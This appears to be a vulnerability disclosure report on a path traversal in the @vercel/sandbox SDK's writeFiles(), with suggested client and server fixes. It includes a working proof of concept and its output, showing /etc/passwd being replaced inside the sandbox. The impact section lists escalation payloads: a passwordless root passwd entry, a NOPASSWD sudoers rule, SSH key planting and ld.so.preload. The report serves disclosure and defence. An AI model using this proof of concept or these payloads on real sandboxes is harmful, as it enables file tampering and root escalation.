# Path Traversal in @vercel/sandbox `writeFiles()` — Arbitrary File Write to `/etc/passwd` → Root Escalation

## Summary

`Sandbox.writeFiles()` does not reject `..` in the `path` of a file. The client
normalises the path but does not validate it, and the resulting archive entry is
extracted by the Sandbox API without sanitising `..` components. A file declared
as `../../etc/passwd` is written to `/etc/passwd` **inside the sandbox**, outside
the working directory the SDK is documented to write to.

`writeFiles()` is the "give the sandbox a file" API — the one you expose to an
untrusted process or AI agent that should not be able to run arbitrary commands.
A path traversal here turns that restricted capability into an arbitrary file
write as the sandbox's privileged user.

## Severity

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H  =  8.8 (High)
```

| Metric | Value | Reasoning |
| --- | --- | --- |
| AV:N | Network | reached through the Sandbox HTTP API |
| AC:L | Low | a single `writeFiles` call, no race or special state |
| PR:L | Low | requires a valid Vercel token / sandbox in your own team |
| UI:N | None | no user interaction |
| S:U | Unchanged | the impact stays inside the sandbox VM |
| C:H / I:H | High | arbitrary read/write of system files, including `/etc/passwd` |
| A:H | High | `/bin/bash`, `/etc/passwd` and the loader config are all writable |

The score assumes the interesting threat model: `writeFiles()` handed to code
that is **not** trusted with `runCommand()`. If the caller already has a root
shell in their own sandbox, this is a boundary-contract violation rather than a
privilege gain, and **Low/Informational** is the fairer rating — decided by your
triage.

## Weakness

- **CWE-22** — Improper Limitation of a Pathname to a Restricted Directory
  ("Path Traversal")
- **CWE-73** — External Control of File Name or Path

Relevant code:

- `packages/vercel-sandbox/src/api-client/api-client.ts:871-880` — `writeFiles()`
  builds the tar entry name from the caller's `path`.
- `packages/vercel-sandbox/src/utils/normalizePath.ts:15` — resolves `..` against
  `cwd` and returns `path.posix.relative(extractDir, basePath)`. It never rejects
  `..`, and the result can start with `../` when the resolved path sits above
  `extractDir`.
- `packages/vercel-sandbox/src/api-client/file-writer.ts:65` — the name is passed
  to `tar-stream`'s `pack.entry({name})` verbatim, with no validation.
- Server side: the extraction step does not reject `..` entries (demonstrated
  below).

## Affected

`@vercel/sandbox@3.8.0` — the version installed for this test
(`packages/vercel-sandbox` in the repository at the analysed commit). Any sandbox
created through that client is affected; the observed sandbox used the default
working directory `/vercel`.

Both sides need to be fixed: the client does not validate the name, and the API's
extraction step does not reject `..` entries. Patching only the client would leave
a hand-crafted tarball sufficient to reproduce this.

## Steps to Reproduce

Prerequisites: a Vercel token with access to a team, and a project. Set
`VERCEL_TOKEN`, `VERCEL_TEAM_ID`, `VERCEL_PROJECT_ID` in the environment.

```js
import { Sandbox } from "@vercel/sandbox";

const sandbox = await Sandbox.create({
  teamId: process.env.VERCEL_TEAM_ID,
  projectId: process.env.VERCEL_PROJECT_ID,
  token: process.env.VERCEL_TOKEN,
  timeout: 120000,
});

// 1. Traversal write: cwd is /vercel, the path climbs out of it
await sandbox.writeFiles([
  { path: "../../etc/passwd", content: "POC-INJECTED-CONTENT" },
]);

// 2. The system file now contains our content
const r = await sandbox.runCommand({ cmd: "cat", args: ["/etc/passwd"] });
console.log(await r.stdout()); // POC-INJECTED-CONTENT

// 3. Control: the sandbox working directory was not the destination
const ls = await sandbox.runCommand({
  cmd: "bash",
  args: ["-c", "ls /vercel/etc/ 2>&1 || echo NOT_FOUND"],
});
console.log(await ls.stdout()); // ls: cannot access '/vercel/etc/': No such file or directory

await sandbox.stop();
```

Observed output (verbatim, from the attached log):

```
Creating sandbox...
[OK] Sandbox ID: sbx_0GhyWvUwF6UlbkwbQSHcTInG4IQt
[INFO] cwd: /vercel

=== Test 1: writeFile('../../etc/passwd', 'INJECTED') ===
[WARN] writeFile succeeded (Path Traversal possible!)

=== Test 2: runCommand('cat /etc/passwd') ===
exitCode: 0
stdout: POC-INJECTED-CONTENT
[CRITICAL] OUR content written to /etc/passwd (Path Traversal CONFIRMED!)

=== Test 3: ls /vercel/etc/ (control) ===
output: ls: cannot access '/vercel/etc/': No such file or directory
NOT_FOUND

=== Test 4: head -5 /etc/passwd ===
output: POC-INJECTED-CONTENT

=== Test 5: wc -c /etc/passwd ===
output: 20 /etc/passwd

=== Stopping sandbox ===
[OK] Done.
```

Note `wc -c`: the file is **20 bytes** — exactly the length of the injected
string, i.e. the original `/etc/passwd` (~1.5 KB) was replaced, not appended to.

## Expected

`writeFiles()` writes relative to the sandbox working directory (`/vercel`).
A path containing `..` that resolves outside it should be rejected — by the
client, or by the server when unpacking the archive — with an error, and the
sandbox filesystem outside `/vercel` should be unchanged.

At minimum the call should throw, as it does for a relative `cwd` in
`normalizePath` (which validates that `cwd` and `extractDir` are absolute).

## Actual

The traversal is resolved and applied: the archive entry becomes `../etc/passwd`
and the server writes it outside `extractDir`, replacing `/etc/passwd`. No error
is raised and nothing in the response indicates that the destination was outside
the working directory.

## Impact

Inside the sandbox VM, as its privileged user:

1. **`/etc/passwd` overwrite → passwordless root.** Replace the file with
   `root::0:0:root:/root:/bin/bash`, then `su root` — no password required. The
   original file is destroyed, which is also a reliable denial of service for the
   sandbox image.
2. **`/etc/sudoers.d/<name>`** — drop a file containing
   `ALL ALL=(ALL) NOPASSWD: ALL` to make the escalation persistent for the
   remainder of the sandbox lifetime.
3. **`/root/.ssh/authorized_keys`** — install an attacker key and connect
   directly, if an SSH daemon is reachable in the image.
4. **`/bin/bash` (or a shared library it loads) overwrite** — any subsequent
   command that spawns a shell runs attacker code as root. This is the most
   useful primitive when the caller controls only file content: combined with a
   process that restarts inside the sandbox, it is code execution rather than
   just data tampering.
5. **`/etc/ld.so.preload`** — load an arbitrary shared object into every
   dynamically linked process, including `runCommand` invocations.

The reason this matters despite the sandbox being disposable is the **capability
model**: `writeFiles()` is the API you give an agent that is not allowed to run
commands. It is supposed to be the safe half of the surface. Escaping the working
directory makes it equivalent to `runCommand` for the purpose of planting code,
and worse for anything that later reads those files with higher privilege.

Out of scope of this finding: writing to the **host** filesystem. The evidence
shows the write landing in the sandbox VM (`/etc/passwd`), not on Vercel's
infrastructure.

## Suggested Fix

**Client — reject before packing** (`normalizePath.ts`):

```ts
const rel = path.posix.relative(params.extractDir, basePath);
if (
  rel === "" ||
  rel === ".." ||
  rel.startsWith("../") ||
  path.posix.isAbsolute(rel)
) {
  throw new Error(`path escapes extractDir: ${params.filePath}`);
}
return rel;
```

**Server — defence in depth, after unpacking each entry:**

```ts
const target = path.resolve(extractDir, entry.name);
if (target !== extractDir && !target.startsWith(extractDir + path.sep)) {
  throw new Error(`refusing to write outside ${extractDir}: ${entry.name}`);
}
```

The server check is the one that matters: the client is attacker-controlled
anyone can POST a hand-crafted tarball to the same endpoint.

**Audit the sibling methods** for the same pattern — every one of them takes a
caller-supplied path and builds a request from it:

- `readFile()` — traversal here reads arbitrary system files (`/etc/shadow`,
  `/root/.ssh/id_rsa`, tokens in `/proc/self/environ`);
- `appendFile()` — appends to `authorized_keys` / `sudoers.d` without replacing
  the file, which is quieter than the write above;
- `mkdir()` — creates directories anywhere, usable to prepare a later write;
- `readdir()` / `stat()` — directory enumeration outside `cwd`.

## Attachments

| File | SHA-256 (first 16) | Contents |
| --- | --- | --- |
| `evidence-poc.mjs` | `fb97c888a81c16e9` | The exact reproduction script (2,625 bytes) |
| `evidence-output.txt` | `df04ce9aa75715bb` | Verbatim console output (671 bytes) |

Both files are included as attachments. The sandbox used for the test
(`sbx_0GhyWvUwF6UlbkwbQSHcTInG4IQt`) was stopped at the end of the run; no
credentials, team or project identifiers appear in either attachment (the script
reads them from environment variables).
